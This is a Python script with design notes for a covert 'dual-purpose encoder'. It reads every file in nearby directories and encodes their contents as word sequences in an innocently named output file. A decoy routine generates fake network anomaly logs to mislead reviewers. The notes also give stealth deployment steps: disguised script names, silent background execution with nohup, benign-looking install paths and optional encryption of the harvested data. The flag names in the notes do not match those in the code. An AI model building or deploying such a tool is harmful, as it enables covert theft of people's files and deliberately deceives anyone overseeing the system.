'''
Design Plan: Deceptive Dual-Purpose Encoder

Part 1: The Hidden Payload (Real Functionality)
The original functionality:

Traverse directories (up/down),
Read all files,
Encode bitstream using 2048-word dictionary,
Write to policyReenforcement.txt.

Part 2: The Cover Functionality (Decoy Output)
A complex, legitimate-looking function that:

Consumes time and CPU.
Writes a second file (e.g., sightings_log.txt) with detailed fake data — like simulated wildlife tracking, AI output, anomaly detection logs, etc.
Includes randomized elements to vary each execution.
Appears scientific or technical, but is meaningless.

-----------------------------------------------------------------------

What This Does:
Obfuscates real intent — the casual reviewer sees only the "decoy" output and complex computation.
Keeps hidden logic fully intact and separated in clean code.
Real operation remains functional and recoverable by those who know where to look.

-----------------------------------------------------------------------

Dual-Purpose Program Structure
Part 1 — Hidden Payload (Real Work)
Same as before: traverse dirs, encode files into policyReenforcement.txt.

Part 2 — Decoy Function (Visible Work)
Generates sightings_log.txt.

Simulates packet logs with:

IPs (randomized source/dest),
Protocols (TCP/UDP/ICMP),
Ports,
Payload size,
Timestamps,
Anomaly score,
Verdict (e.g., “normal”, “suspicious”, “drop”, “flagged”).

Each line will look realistic to a casual analyst.

-----------------------------------------------------------------------

Example Fake Log Output:
[2025-05-21 20:13:54] SRC:192.168.7.42 DST:10.0.0.5 PROTO:UDP SPORT:514 DPORT:8080 SIZE:512B ANOMALY:0.02 VERDICT:normal
[2025-05-21 20:13:55] SRC:172.16.0.12 DST:10.0.0.9 PROTO:TCP SPORT:443 DPORT:22 SIZE:1040B ANOMALY:0.89 VERDICT:flagged
'''
'''
Flag Names (in Sightings branch):
-- m1Actual-only → Runs only the true file encoding logic (writes policyReenforcement.txt).

-- m1Alternate-only → Runs only the decoy network anomaly generator (writes sightings_log.txt).

With no flags, both parts run together.

Example Usages:
python sightings.py --m1Actual-only
python sightings.py --m1Alternate-only
python sightings.py                # runs both
'''
# ------------------NEW UPDATES-------------------------------------
'''
Deployment Plan: Stealth Mode for Sightings
1. Rename the Script

Make it blend in:
<mv sightings.py sysdiag_util.py>

Example names:
- diag_agent.py
- net_watchdog.py
- update_inspector.py
'''
'''
2. Make it Executable
Add a shebang and permissions:
<#!/usr/bin/env python3>

Then:
<chmod +x sysdiag_util.py>

3. Create .pyz Single-File Executable
Bundle into a compressed Python archive:
<python3 -m zipapp sysdiag_util.py -o sysdiag_util.pyz -m "sysdiag_util:main">

Launch with:
<python3 sysdiag_util.pyz>

4. Hide Execution in Background
Use nohup or & to run silently:
<nohup python3 sysdiag_util.pyz --m1Actual-only > /dev/null 2>&1 &>

5. Install with a Benign Path
Install in one of these:

-- /usr/local/bin/diag
-- ~/Library/Application Support/UpdateMonitor/
-- C:\ProgramData\SystemLogs\

6. Optional Enhancements
- Add XOR or AES encryption to policyReenforcement.txt
- Compress payload before word-mapping
- Rotate decoy wordlists/log styles
- Split output across multiple .log files
'''

import os
import random
import datetime
import argparse

# === Load Wordlist ===
with open('wordlist.txt', 'r') as f:
    WORDLIST = [line.strip() for line in f.readlines()]
assert len(WORDLIST) == 2048
WORD_INDEX = {word: idx for idx, word in enumerate(WORDLIST)}

# === Real Payload ===
def get_scan_dirs(start_dir, up=2, down=2):
    dirs_to_scan = set()
    current = start_dir
    for _ in range(up + 1):
        if os.path.isdir(current):
            dirs_to_scan.add(current)
        current = os.path.dirname(current)
    final_dirs = set()
    for d in dirs_to_scan:
        for root, _, _ in os.walk(d):
            if os.path.relpath(root, d).count(os.sep) <= down:
                final_dirs.add(root)
    return final_dirs

def encode_files(directories, output_path='policyReenforcement.txt'):
    encoded_output = []
    for base_dir in directories:
        for root, _, files in os.walk(base_dir):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        binary = f.read()
                    if not binary:
                        continue
                    rel_path = os.path.relpath(file_path, base_dir)
                    bits = ''.join(f'{b:08b}' for b in binary)
                    chunks = [bits[i:i+11] for i in range(0, len(bits), 11)]
                    if len(chunks[-1]) < 11:
                        chunks[-1] = chunks[-1].ljust(11, '0')
                    words = [WORDLIST[int(chunk, 2)] for chunk in chunks]
                    encoded_output.append(f"::FILE_START::{rel_path}")
                    encoded_output.append(' '.join(words))
                    encoded_output.append("::FILE_END::\n")
                except:
                    continue
    with open(output_path, 'w') as f:
        f.write('\n'.join(encoded_output))

# === Decoy Output ===
def generate_fake_packet_log_entries(num_entries=100):
    verdicts = ['normal', 'suspicious', 'drop', 'flagged']
    protocols = ['TCP', 'UDP', 'ICMP']
    logs = []
    for _ in range(num_entries):
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        src_ip = f"{random.randint(10, 192)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        dst_ip = f"{random.randint(10, 192)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        proto = random.choice(protocols)
        sport = random.randint(1, 65535)
        dport = random.randint(1, 65535)
        size = random.randint(64, 1500)
        anomaly = round(random.uniform(0, 1), 2)
        verdict = random.choices(verdicts, weights=[80, 10, 5, 5])[0]
        log_entry = (
            f"[{timestamp}] SRC:{src_ip} DST:{dst_ip} PROTO:{proto} "
            f"SPORT:{sport} DPORT:{dport} SIZE:{size}B ANOMALY:{anomaly} VERDICT:{verdict}"
        )
        logs.append(log_entry)
    return logs

def write_sightings_log(output_path='sightings_log.txt'):
    logs = generate_fake_packet_log_entries()
    with open(output_path, 'w') as f:
        for entry in logs:
            f.write(entry + '\n')

# === CLI Entry Point ===
def run_main(real=True, fake=True):
    base_dir = os.getcwd()
    dirs = get_scan_dirs(base_dir)
    if real:
        encode_files(dirs)
        print("✅ Real encoding complete -> policyReenforcement.txt")
    if fake:
        write_sightings_log()
        print("✅ Decoy log complete -> sightings_log.txt")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Sightings: Dual-Purpose Encoder")
    parser.add_argument('--real-only', action='store_true', help='Only run the real encoding payload')
    parser.add_argument('--fake-only', action='store_true', help='Only run the decoy packet analyzer')
    args = parser.parse_args()

    real = not args.fake_only
    fake = not args.real_only
    run_main(real=real, fake=fake)
